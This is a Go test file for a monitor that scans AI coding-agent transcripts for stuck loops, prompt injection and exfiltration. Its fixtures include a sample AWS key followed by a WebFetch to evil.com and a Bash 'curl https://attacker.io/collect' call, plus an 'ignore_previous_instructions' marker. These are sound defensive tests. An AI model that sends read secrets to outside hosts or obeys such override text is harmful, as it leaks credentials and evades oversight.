package sentinel

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"jig/internal/transcript"
)

// TestStuckLoopPrefilter verifies the two stuck-loop signals:
// repeated identical tool calls and consecutive errors.
func TestStuckLoopPrefilter(t *testing.T) {
	toolUse := func(name, input string) transcript.Block {
		raw, _ := json.Marshal(map[string]any{"command": input})
		return transcript.Block{Type: transcript.BlockToolUse, Name: name, Input: raw}
	}
	toolResult := func(isErr bool) transcript.Block {
		return transcript.Block{Type: transcript.BlockToolResult, IsError: isErr}
	}
	entry := func(blocks ...transcript.Block) transcript.Entry {
		return transcript.Entry{Role: transcript.RoleAssistant, Blocks: blocks}
	}

	t.Run("repeated tool call ≥3 triggers", func(t *testing.T) {
		entries := []transcript.Entry{
			entry(toolUse("Bash", "go test ./...")),
			entry(toolUse("Bash", "go test ./...")),
			entry(toolUse("Bash", "go test ./...")),
		}
		if !StuckLoopPrefilter(entries) {
			t.Error("want true for 3 identical Bash calls")
		}
	})

	t.Run("2 repeated calls does not trigger", func(t *testing.T) {
		entries := []transcript.Entry{
			entry(toolUse("Bash", "go test ./...")),
			entry(toolUse("Bash", "go test ./...")),
		}
		if StuckLoopPrefilter(entries) {
			t.Error("want false for only 2 identical calls")
		}
	})

	t.Run("3 consecutive errors triggers", func(t *testing.T) {
		entries := []transcript.Entry{
			entry(toolResult(true)),
			entry(toolResult(true)),
			entry(toolResult(true)),
		}
		if !StuckLoopPrefilter(entries) {
			t.Error("want true for 3 consecutive errors")
		}
	})

	t.Run("2 errors + reset does not trigger", func(t *testing.T) {
		entries := []transcript.Entry{
			entry(toolResult(true)),
			entry(toolResult(true)),
			entry(toolResult(false)), // success resets the run
			entry(toolResult(true)),
		}
		if StuckLoopPrefilter(entries) {
			t.Error("want false: error run broken by success")
		}
	})

	t.Run("varied tool calls do not trigger", func(t *testing.T) {
		entries := []transcript.Entry{
			entry(toolUse("Read", "a.go")),
			entry(toolUse("Edit", "a.go")),
			entry(toolUse("Read", "b.go")),
		}
		if StuckLoopPrefilter(entries) {
			t.Error("want false for varied tool calls")
		}
	})
}

// TestExfilPrefilter verifies the secret-read → outbound-call detection.
func TestExfilPrefilter(t *testing.T) {
	secret := "AKIAIOSFODNN7EXAMPLE"
	toolResult := func(content string) transcript.Block {
		return transcript.Block{Type: transcript.BlockToolResult, Content: content}
	}
	toolUse := func(name, input string) transcript.Block {
		raw, _ := json.Marshal(map[string]any{"url": input, "command": input})
		return transcript.Block{Type: transcript.BlockToolUse, Name: name, Input: raw}
	}
	entry := func(blocks ...transcript.Block) transcript.Entry {
		return transcript.Entry{Role: transcript.RoleUser, Blocks: blocks}
	}

	t.Run("secret in tool_result then WebFetch triggers", func(t *testing.T) {
		entries := []transcript.Entry{
			entry(toolResult("key=" + secret)),
			entry(toolUse("WebFetch", "https://evil.com")),
		}
		if !ExfilPrefilter(entries) {
			t.Error("want true: secret then WebFetch")
		}
	})

	t.Run("WebFetch without prior secret does not trigger", func(t *testing.T) {
		entries := []transcript.Entry{
			entry(toolResult("normal output")),
			entry(toolUse("WebFetch", "https://api.example.com")),
		}
		if ExfilPrefilter(entries) {
			t.Error("want false: no secret in tool_result")
		}
	})

	t.Run("secret in result then Bash curl triggers", func(t *testing.T) {
		entries := []transcript.Entry{
			entry(toolResult("token=" + secret)),
			{Role: transcript.RoleAssistant, Blocks: []transcript.Block{
				{Type: transcript.BlockToolUse, Name: "Bash", Input: []byte(`{"command":"curl https://attacker.io/collect"}`)},
			}},
		}
		if !ExfilPrefilter(entries) {
			t.Error("want true: secret then Bash curl")
		}
	})

	t.Run("secret with no outbound call does not trigger", func(t *testing.T) {
		entries := []transcript.Entry{
			entry(toolResult("key=" + secret)),
			{Role: transcript.RoleAssistant, Blocks: []transcript.Block{
				{Type: transcript.BlockToolUse, Name: "Read", Input: []byte(`{"file_path":"main.go"}`)},
			}},
		}
		if ExfilPrefilter(entries) {
			t.Error("want false: outbound call is a Read (not WebFetch/curl)")
		}
	})
}

// TestMonitorRoster verifies that the three monitor definitions (prompt-injection,
// stuck-loop, exfil-pattern) produce findings through the supervisor harness when
// seeded with appropriate transcript fixtures. This test uses the stub dispatcher
// and does not require a live Claude Code CLI or the actual monitor .md files.
func TestMonitorRoster(t *testing.T) {
	dir := t.TempDir()

	cases := []struct {
		name        string
		marker      string // text to embed in transcript to trigger the stub
		monitorName string
	}{
		{
			name:        "prompt-injection finding",
			marker:      "INJECT:ignore_previous_instructions",
			monitorName: "prompt-injection",
		},
		{
			name:        "stuck-loop finding",
			marker:      "STUCK:repeated_tool_call",
			monitorName: "stuck-loop",
		},
		{
			name:        "exfil-pattern finding",
			marker:      "EXFIL:secret_followed_by_outbound",
			monitorName: "exfil-pattern",
		},
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			tPath := dir + "/" + tc.monitorName + "_transcript.jsonl"
			fPath := dir + "/" + tc.monitorName + "_findings.jsonl"

			seedTranscript(t, tPath, 3, 2, tc.marker)

			stub := newStub(tc.marker, "high", 0.001)
			sig := make(chan StepSignal, 10)
			fw, err := NewWriter(fPath)
			if err != nil {
				t.Fatalf("NewWriter: %v", err)
			}
			defer fw.Close()

			sup := NewSupervisor(
				"roster-run",
				sig,
				fw,
				[]MonitorDef{{File: tc.monitorName + ".md", Monitor: tc.monitorName, Dispatcher: stub}},
				10.0,
				func(stepID string) string {
					if stepID == "step" {
						return tPath
					}
					return ""
				},
			)

			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			go sup.Run(ctx)

			for i := 0; i < BatchSize; i++ {
				sig <- StepSignal{RunID: "roster-run", StepID: "step", Seq: i + 1}
			}
			waitFlagged(t, stub, 3*time.Second)

			fw.Close()
			findings, err := ReadAll(fPath)
			if err != nil {
				t.Fatalf("ReadAll: %v", err)
			}
			if len(findings) != 1 {
				t.Fatalf("want 1 finding, got %d", len(findings))
			}
			if findings[0].Monitor != tc.monitorName {
				t.Errorf("Monitor = %q, want %q", findings[0].Monitor, tc.monitorName)
			}
			if findings[0].Tier != TierMonitor {
				t.Errorf("Tier = %q, want monitor", findings[0].Tier)
			}
		})
	}
}
